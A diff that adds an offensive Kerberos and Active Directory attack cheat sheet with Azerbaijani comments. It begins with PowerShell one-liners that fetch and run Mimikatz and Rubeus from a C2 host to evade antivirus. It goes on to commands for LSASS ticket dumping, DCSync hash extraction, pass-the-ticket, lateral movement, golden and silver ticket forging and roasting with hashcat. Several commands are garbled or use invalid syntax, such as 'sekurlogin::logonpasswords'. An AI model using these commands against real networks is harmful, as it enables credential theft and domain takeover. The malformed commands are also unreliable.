@@ -1,3 +1,75 @@
-# **Kerberos**
+# PowerShell Reflective Loading (AV bypass)
+IEX (New-Object Net.WebClient).DownloadString('http://C2/mimikatz.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://C2/Rubeus.ps1')
 
+# Mimikatz exe (x64)
+.\mimikatz.exe
 
+======= Privilege Check və LSASS Dump ===============================================================================================================================================
+
+=== MIMIKATZ ===
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export          # Bütün ticket-ləri .kirbi kimi saxla
+mimikatz # sekurlsa::ekeys                    # AES anahtarları (Silver ticket üçün)
+
+mimikatz # sekurlogin::logonpasswords /patch  # KPSS + ticket dump
+
+=== RUBEUS ===
+Rubeus.exe triage /luid:0x... /dump           # Bütün ticket-ləri dump
+Rubeus.exe dump /user:krbtgt /service:cifs/dc # DA/DC ticket-ləri
+
+======= DCSync (Hash Çıxarma) ====================================================================================================================================================
+
+=== MIMIKATZ ===
+lsadump::dcsync /domain:target.domain.local /user:krbtgt
+lsadump::dcsync /domain:target.domain.local /all  # Bütün user hash-ləri
+
+=== RUBEUS (Alternativ) ===
+Rubeus.exe dump /user:krbtgt /service:krbtgt
+
+======= PassTheTicket (PTT) =======================================================================================================================================================================
+
+=== MIMIKATZ ===
+kerberos::ptt C:\temp\krbtgt.kirbi            # Əsas ticket import
+kerberos::ptt C:\temp\*.kirbi                 # Bütün ticket-ləri
+
+=== RUBEUS ===
+Rubeus.exe ptt /ticket:krbtgt.kirbi
+Rubeus.exe ptt /ticket:"C:\Ticket_PAth"
+
+======= Lateral Movement =======================================================================================================================================================================
+
+# PTT aktiv ticket ilə:
+psexec \\target-host cmd.exe /accepteula
+wmiexec.py -k -no-pass administrator@target-host
+
+# RDP (Visual access)
+xfreerdp /u:DOMAIN\krbtgt /v:target-host /f
+
+# WMI alternative
+Rubeus.exe ptt /ticket:ticket.kirbi /service:wmi /target:target-host
+
+======= Golden/Silver Ticket Generasiya =======================================================================================================================================================================
+
+=== RUBEUS (Tövsiyə olunur) ===
+# Golden Ticket (DCSync krbtgt hash ilə)
+Rubeus.exe golden /adminuser:Administrator /domain:target.local /sid:S-1-5-21-xxx /krbtgt:502a_hash /ptt
+
+# Silver Ticket (Service-specific)
+Rubeus.exe silver /user:admin /domain:target.local /service:cifs /target:dc01 /aes256:aes_key /ptt
+
+=== MIMIKATZ ===
+kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-xxx /krbtgt:502a_hash /ptt
+
+======= Əlavə Kerberos Hücumları =======================================================================================================================================================================
+
+=== Roasting Attacks ===
+Rubeus.exe kerberoast /domain:target.local /outfile:hashes.txt
+Rubeus.exe asreproast /domain:target.local /outfile:asrep.txt
+
+# Crack
+hashcat -m 13100 hashes.txt rockyou.txt
+hashcat -m 18200 asrep.txt rockyou.txt
+
+=== ASKTGT (Alternativ PTT) ===
+Rubeus.exe asktgt /domain:target.local /user:plaintext /rc4:ntlm_hash /ptt
